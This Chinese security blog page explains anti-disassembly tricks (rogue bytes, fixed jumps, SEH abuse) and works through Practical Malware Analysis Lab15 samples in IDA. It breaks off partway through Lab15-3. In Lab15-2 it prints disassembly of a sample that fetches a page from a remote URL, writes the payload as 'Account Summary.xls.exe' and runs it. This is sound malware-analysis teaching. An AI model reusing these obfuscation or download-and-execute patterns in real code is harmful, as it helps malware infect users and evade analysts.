@@ -1,0 +1,569 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" href="/img/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="
+知识点所谓对抗反汇编技术，就是在程序中使用一些特殊构造的代码或数据，让反汇编分析工具产生不正确的程序代码列表。这种技术由恶意代码编写者手工构造，在恶意代码编译和部署阶段使用一个单独的混淆工具，或是直接在源码中插入混淆代码。除了延缓或者防止人工分析以外，防反汇编技术也能在一定程度上阻碍特定的自动化分析技术。
+线性反汇编：线性反汇编策略是遍历一个代码段，一次一条指令地线性反汇编，线性反汇编用已经反汇">
+  <meta name="author" content="Hvnt3r">
+  <meta name="keywords" content="CTF, WEB安全, 二进制安全">
+  
+  <title>防反汇编技术 - Hvnt3r&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/xcode.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"www.hvnt3r.top","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"❡"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="Hvnt3r's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Hvnt3r</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="防反汇编技术">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-03-26 23:08" pubdate>
+        2019年3月26日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      54
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">防反汇编技术</h1>
+            
+            <div class="markdown-body">
+              <hr>
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>所谓对抗反汇编技术，就是在程序中使用一些特殊构造的代码或数据，让反汇编分析工具产生不正确的程序代码列表。这种技术由恶意代码编写者手工构造，在恶意代码编译和部署阶段使用一个单独的混淆工具，或是直接在源码中插入混淆代码。除了延缓或者防止人工分析以外，防反汇编技术也能在一定程度上阻碍特定的自动化分析技术。</p>
+<p><strong>线性反汇编：</strong>线性反汇编策略是遍历一个代码段，一次一条指令地线性反汇编，线性反汇编用已经反汇编地指令大小来决定下一个要反汇编的字节，而不考虑代码流的控制指令。</p>
+<p><strong>面向代码流的反汇编：</strong>面向代码流的反汇编算法是一种更先进的反汇编宣发，这种算法会根据后续代码的逻辑来选择汇编的字节流，因此结果一般情况下会更加准确。</p>
+<p><strong>相同目标的跳转指令：</strong>恶意代码中最常见的防反汇编技术是使用指向同一目标地址的两个连续条件跳转指令。例如<code>jz loc_512</code>之后是 <code>jnz loc_512</code>则这个指令就相当于无条件跳转指令<code>jmp</code>，另外程序可能会在代码中插入与指令相同额数据如用E8来冒充call指令，实际上使用的是E8后面的字节，E8并没有发挥作用。遇到这种情况可以使用快捷键D使代码变成数据。</p>
+<span id="more"></span>
+
+<p><strong>使用固定的跳转指令：</strong>程序会使用<code>xor eax, eax</code>开头，再跟上条件跳转指令，使反汇编器一位这是一个条件跳转指令实际上是一个固定的跳转指令。</p>
+<p><strong>无效的反汇编指令：</strong>程序通过插入单字节的流氓无效指令来干扰反汇编器的正常分析进程。</p>
+<p><strong>函数指针问题：</strong>再程序中刻意使用函数指针可以大大降低反汇编器自动推导出的程序的信息量，如果带汇编语言中刻意使用函数指针或者在源码中构造不标准的函数指针格式，会导致在没有动态分析的前提下很难进行逆向工程。如将某一个函数的偏移地址存入<code>eax</code>，再通过<code>call eax</code>的形式来调用函数。</p>
+<p><strong>通过添加代码交叉引用来修复函数指针混淆：</strong>可以使用IDC脚本来修复混淆的函数调用，例如下列代码是来指明函数4011DE交叉引用来源的位置，交叉引用指向的位置，以及流的类型（call指令类型<code>fl_CF</code>，或是跳转指令类型<code>fl_JF</code>）</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">AddCodeXref</span><span class="hljs-params">(<span class="hljs-number">0</span>x4011DE,<span class="hljs-number">0</span>x4011AB,fl_CF)</span></span><br></code></pre></td></tr></table></figure>
+
+<p><code>retn</code>通常被用来返回一个函数调用滥用返回指针：再程序中<code>call</code>指令和<code>jmp</code>指令并不是唯一控制转换控制流的指令。与<code>call</code>指令对应的是<code>retn</code>，<code>call</code>指令与<code>jmp</code>指令的差别是<code>call</code>会将函数的返回地址压入栈中，返回点是一个紧跟call指令的一个内存地址。<code>call</code>指令相当于<code>jmp</code>指令加<code>push</code>指令，<code>retn</code>指令相当于<code>jmp</code>指令加<code>pop</code>指令，<code>retn</code>指令首先从栈顶弹出一个返回值，然后跳转到返回地址，<code>retn</code>指令通常被用来返沪一个函数调用，但是由于体系结构的限制，他一般不能用于控制执行流。</p>
+<p><strong>滥用结构化异常处理：</strong>结构化异常处理（SEH）提供一种控制流的方法，该方法不能被反汇编器采用，但可以用来欺骗反汇编器，<code>SEH</code>旨在位程序提供一种智能处理错误条件的方法没编程语言例如<code>C++</code>严重依赖异常处理。异常触发可能有多种原因，例如访问一个无效的内存区域、除零等。可以调用函数<code>RaiseException</code>函数产生额外的软件异常，<code>SEH</code>是一个函数列表，设计他的目的是处理线程中的异常，列表中的每个函数，要么处理异常，要么将异常传递给下一个异常处理函数，如果一个异常总是被传递到最后一个异常处理函数中，就会被认为这是一个不能处理的异常，这种情况下，最后一个异常处理函数会弹出一个熟悉的消息对话框，通知用户产生了一个无法处理的异常，为了查找SEH链，操作系统会检查FS段寄存器。这个寄存器包含一个段选择子可以得到线程环境块（TEB）。<code>TEB</code>的第一个数据结构是线程信息块<code>TIB</code>，<code>TIB</code>中的第一个元素及<code>TIB</code>的第一个字节就是SEH链的指针，SEH链是一个简单的8字节数据结构链表，这八个字节数据结构叫做<code>EXCEPETION_REGISTRATION</code>记录：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION_REGISTRATION</span>&#123;</span><br>    DWORD prev; <span class="hljs-comment">//指向前一个记录的指针</span><br>    DWORD handler; <span class="hljs-comment">//指向异常处理的指针</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>从概念上讲，这个链表以栈的方式进行操作，第一个调用的是最后一个加入链表的记录，由于子进程的调用与嵌套异常处理块的原因，SEH链的增长和缩小等同于程序中异常处理层的改变，所以SEH记录总是在栈上。</p>
+<p>为了实现向<code>SEH</code>中添加函数，需要在栈上构造一条新的记录，因为记录结构由两个<code>DWORD</code>变量组成，所以使用两个<code>push</code>指令来完成，栈的增长方向是从下向上，所以第一个<code>push</code>进栈的是异常处理函数指针，第二个是下一条记录的指针，当添加一条记录到链表头部时，下一条记录需要完成异常处理的是当前的栈顶，它由<code>fs:[0]</code>指针指出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">push ExceptionHandler<br>push fs:[0]<br>mov fs:[0],esp<br></code></pre></td></tr></table></figure>
+
+<p>异常发生时，首先将调用函数<code>ExceptionHandler</code>，这个动作会受到微软的<code>DEP</code>保护的限制 ，对于DEP他的目的是阻止应用程序在运行的过程中添加第三方的异常处理，可以使用支持<code>SafeSEH</code>指令的汇编器，另外，使用微软的C编译器也能到达此目的，添加<code>/SAFESEH:NO</code>到链接器命令行就可以使这种限制失效。</p>
+<p>当调用<code>ExceptionHandler</code>函数时，栈将大幅改变。我们需要知道怎么返回异常发生前的栈位置，当异常处理被调用时，操作系统添加了其他的<code>SEH</code>处理，为了让程序恢复正常操作，我们需要将异常处理从异常处理链中断开，还要将系如添加的异常处理从异常处理链中断开，因此我们需要从<code>esp+8</code>而不是<code>esp</code>中取出原始的栈指针：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov esp, [esp+8]<br>mov eax, fs:[0]<br>mov eax, [eax]<br>mov eax, [eax]<br>mov fs:[0], eax<br>add esp, 8<br></code></pre></td></tr></table></figure>
+
+<p><strong>挫败栈帧分析：</strong>先进的反汇编器能够通过分析一个函数中指令推导出函数栈的结构，这使得反汇编器能够显示局部变量及函数相关的参数。这些信息对恶意代码分析人员非常有价值，它使得分析人员一次分析一个函数，并且可以更好的理解函数的输入输出及结构，然而通过一个函数来确定它的栈帧结构并不十分科学，与反汇编的很多其他因素一样，用来决定栈帧结构的算法必须做出某些假设与合理猜想，但是这很容易被有经验的恶意代码编写者利用。挫败栈帧分析也可以阻止特定的技术分析操作，其中最明显的时IDA反编译插件，他可以产生一个函数的类C语言伪代码。</p>
+<h2 id="课后练习"><a href="#课后练习" class="headerlink" title="课后练习"></a>课后练习</h2><h3 id="Lab15-1"><a href="#Lab15-1" class="headerlink" title="Lab15-1"></a>Lab15-1</h3><p><strong>分析样本Lab15-01.exe它是一个命令行程序，它接收一个参数，如果这个参数与一个秘密代码相匹配，程序会输出”Good Job！”。</strong></p>
+<p><strong>问题</strong></p>
+<p><strong>1.这个二进制程序中使用了哪种防反汇编技术？</strong></p>
+<p>此程序使用了永假条件分支技术例如如下代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:0040100C                 xor     eax, eax<br>.text:0040100E                 jz      short near ptr loc_401010+1<br>.text:00401010<br>.text:00401010 loc_401010:                             ; CODE XREF: _main+E↑j<br>.text:00401010                 call    near ptr 8B4C55A0h<br></code></pre></td></tr></table></figure>
+
+<p>由于在0040100C 处清空了eax，所以下面的jz指令必定会执行，但是指向的位置却又错误，将00401010处代码属性修改为数据然后跳过一个字节使用C将后续的数据重新修改为代码可以得到修改之后的代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:0040100C                 xor     eax, eax<br>.text:0040100E                 jz      short loc_401011<br>.text:0040100E ; ---------------------------------------------------------------------------<br>.text:00401010                 db 0E8h<br>.text:00401011 ; ---------------------------------------------------------------------------<br>.text:00401011<br>.text:00401011 loc_401011:                             ; CODE XREF: _main+E↑j<br>.text:00401011                 mov     eax, [ebp+arg_4]<br>.text:00401014                 mov     ecx, [eax+4]<br>.text:00401017                 movsx   edx, byte ptr [ecx]<br>.text:0040101A                 cmp     edx, 70h<br>.text:0040101D                 jnz     short loc_40105E<br>.text:0040101F                 xor     eax, eax<br>.text:00401021                 jz      short loc_401024<br></code></pre></td></tr></table></figure>
+
+<p><strong>2.这个二进制程序中使用了什么流氓机器码来欺骗反汇编过程？</strong></p>
+<p>可见0E8h是用于干扰IDA分析的无用数据。</p>
+<p><strong>3.这个反汇编技术被用了多少次？</strong></p>
+<p>5</p>
+<p><strong>4.什么命令行参数会让程序输出”Good Job!”?</strong></p>
+<p>修改完成后将修改的部分选中按P键使IDA将区间内代码识别为一个函数就能得出函数逻辑了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br><br>  <span class="hljs-keyword">if</span> ( argc != <span class="hljs-number">2</span> || *argv[<span class="hljs-number">1</span>] != <span class="hljs-number">112</span> || argv[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>] != <span class="hljs-number">113</span> || argv[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] != <span class="hljs-number">100</span> )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(aSonIAmDisappoi);<br>    result = <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(Format);<br>    result = <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>所以应该输入<code>pdq</code>。</p>
+<h3 id="Lab15-2"><a href="#Lab15-2" class="headerlink" title="Lab15-2"></a>Lab15-2</h3><p><strong>分析恶意代码文件Lab15-02.exe。要回答下列问题，请在分析二进制文件前，修正所有的反汇编技术。</strong></p>
+<p>跟上一题类似，看到由错误的引用就先修正为数据然后在恰当的位置起始修改为代码，完成之后p一下修复成函数。</p>
+<p><strong>问题</strong></p>
+<p><strong>1.程序初始化请求的URL是什么？</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:0040138F                 db  68h ; h<br>.text:00401393                 db  74h ; t<br>.text:00401397                 db  74h ; t<br>.text:0040139B                 db  70h ; p<br>.text:0040139F                 db  3Ah ; :<br>.text:004013A3                 db  2Fh ; /<br>.text:004013A7                 db  2Fh ; /<br>.text:004013AB                 db  77h ; w<br>.text:004013AF                 db  77h ; w<br>.text:004013B3                 db  77h ; w<br>.text:004013B7                 db  2Eh ; .<br>.text:004013BB                 db  70h ; p<br>.text:004013BF                 db  72h ; r<br>.text:004013C3                 db  61h ; a<br>.text:004013C7                 db  63h ; c<br>.text:004013CB                 db  74h ; t<br>.text:004013CF                 db  69h ; i<br>.text:004013D3                 db  63h ; c<br>.text:004013D7                 db  61h ; a<br>.text:004013DB                 db  6Ch ; l<br>.text:004013DF                 db  6Dh ; m<br>.text:004013E3                 db  61h ; a<br>.text:004013E7                 db  6Ch ; l<br>.text:004013EB                 db  77h ; w<br>.text:004013EF                 db  61h ; a<br>.text:004013F3                 db  72h ; r<br>.text:004013F7                 db  65h ; e<br>.text:004013FB                 db  61h ; a<br>.text:004013FF                 db  6Eh ; n<br>.text:00401403                 db  61h ; a<br>.text:00401407                 db  6Ch ; l<br>.text:0040140B                 db  79h ; y<br>.text:0040140F                 db  73h ; s<br>.text:00401413                 db  69h ; i<br>.text:00401417                 db  73h ; s<br>.text:0040141B                 db  2Eh ; .<br>.text:0040141F                 db  63h ; c<br>.text:00401423                 db  6Fh ; o<br>.text:00401427                 db  6Dh ; m<br>.text:0040142B                 db  2Fh ; /<br>.text:0040142F                 db  62h ; b<br>.text:00401433                 db  61h ; a<br>.text:00401437                 db  6Dh ; m<br>.text:0040143B                 db  62h ; b<br>.text:0040143F                 db  6Fh ; o<br>.text:00401443                 db  6Fh ; o<br>.text:00401447                 db  2Eh ; .<br>.text:0040144B                 db  68h ; h<br>.text:0040144F                 db  74h ; t<br>.text:00401453                 db  6Dh ; m<br>.text:00401457                 db  6Ch ; l<br></code></pre></td></tr></table></figure>
+
+<p><strong>2.User-Agent域时如何产生的？</strong></p>
+<p>伪C代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span> &amp;&amp; name[i]; ++i )<br>&#123;<br>	<span class="hljs-keyword">switch</span> ( name[i] )<br>	&#123;<br>		<span class="hljs-keyword">case</span> <span class="hljs-number">90</span>:<br>          name[i] = <span class="hljs-string">&#x27;A&#x27;</span>;<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">122</span>:<br>          name[i] = <span class="hljs-string">&#x27;a&#x27;</span>;<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">57</span>:<br>          name[i] = <span class="hljs-string">&#x27;0&#x27;</span>;<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>          ++name[i];<br>          <span class="hljs-keyword">break</span>;<br>      &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>3.初始化请求时，程序在内存页中查找什么？</strong></p>
+<p>程序会在缓冲区中寻找字符串<code>Bamboo::</code>的位置并提取<code>Bamboo::</code>字符串之后的内容</p>
+<p><strong>4.程序如何处理它从页中提取的信息？</strong></p>
+<p>程序会调用函数sub_40130F :</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:0040130F                 push    ebp<br>.text:00401310                 mov     ebp, esp<br>.text:00401312                 sub     esp, 18h<br>.text:00401315                 mov     [ebp+Src], &#x27;A&#x27;<br>.text:00401319                 mov     [ebp+var_17], &#x27;c&#x27;<br>.text:0040131D                 mov     [ebp+var_16], &#x27;c&#x27;<br>.text:00401321                 mov     [ebp+var_15], &#x27;o&#x27;<br>.text:00401325                 mov     [ebp+var_14], &#x27;u&#x27;<br>.text:00401329                 mov     [ebp+var_13], &#x27;n&#x27;<br>.text:0040132D                 mov     [ebp+var_12], &#x27;t&#x27;<br>.text:00401331                 mov     [ebp+var_11], &#x27; &#x27;<br>.text:00401335                 mov     [ebp+var_10], &#x27;S&#x27;<br>.text:00401339                 mov     [ebp+var_F], &#x27;u&#x27;<br>.text:0040133D                 mov     [ebp+var_E], &#x27;m&#x27;<br>.text:00401341                 mov     [ebp+var_D], &#x27;m&#x27;<br>.text:00401345                 mov     [ebp+var_C], &#x27;a&#x27;<br>.text:00401349                 mov     [ebp+var_B], &#x27;r&#x27;<br>.text:0040134D                 mov     [ebp+var_A], &#x27;y&#x27;<br>.text:00401351                 mov     [ebp+var_9], &#x27;.&#x27;<br>.text:00401355                 mov     [ebp+var_8], &#x27;x&#x27;<br>.text:00401359                 mov     [ebp+var_7], &#x27;l&#x27;<br>.text:0040135D                 mov     [ebp+var_6], &#x27;s&#x27;<br>.text:00401361                 mov     [ebp+var_5], &#x27;.&#x27;<br>.text:00401365                 mov     [ebp+var_4], &#x27;e&#x27;<br>.text:00401369                 mov     [ebp+var_3], &#x27;x&#x27;<br>.text:0040136D                 mov     [ebp+var_2], &#x27;e&#x27;<br>.text:00401371                 mov     [ebp+var_1], 0<br>.text:00401375                 lea     eax, [ebp+Src]<br>.text:00401378                 push    eax             ; Src<br>.text:00401379                 call    ds:_strdup<br>.text:0040137F                 add     esp, 4<br>.text:00401382                 mov     esp, ebp<br>.text:00401384                 pop     ebp<br>.text:00401385                 retn<br></code></pre></td></tr></table></figure>
+
+<p>将读取的数据流写入文件<code>Account Summary.xls.exe</code>，调用<code>ShellExecuteA</code>执行文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:004012EF                 push    0Ah             ; nShowCmd<br>.text:004012F1                 push    0               ; lpDirectory<br>.text:004012F3                 push    0               ; lpParameters<br>.text:004012F5                 mov     eax, [ebp+Filename]<br>.text:004012FB                 push    eax             ; lpFile<br>.text:004012FC                 push    0               ; lpOperation<br>.text:004012FE                 push    0               ; hwnd<br>.text:00401300                 call    ds:ShellExecuteA<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="Lab15-3"><a href="#Lab15-3" class="headerlink" title="Lab15-3"></a>Lab15-3</h3><p><strong>分析恶意代码文件Lab15-03.exe。乍一看这个二进制程序似乎是一个合法工具，但实际上他的功能远远超过它所告知的功能。</strong></p>
+<p><strong>问题</strong></p>
+<p><strong>1.恶意代码怎样被初始化调用？</strong></p>
+<p>翻了一下发现了一段比较奇怪的代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:004014C0 loc_4014C0:                             ; DATA XREF: .text:loc_401497↑o<br>.text:004014C0                 mov     esp, [esp+8]<br>.text:004014C4                 mov     eax, large fs:0<br>.text:004014CA                 mov     eax, [eax]<br>.text:004014CC                 mov     eax, [eax]<br>.text:004014CE                 mov     large fs:0, eax<br>.text:004014D4                 add     esp, 8<br>.text:004014D4 ; ---------------------------------------------------------------------------<br>.text:004014D7                 db 0EBh<br>.text:004014D8 ; ---------------------------------------------------------------------------<br>.text:004014D8                 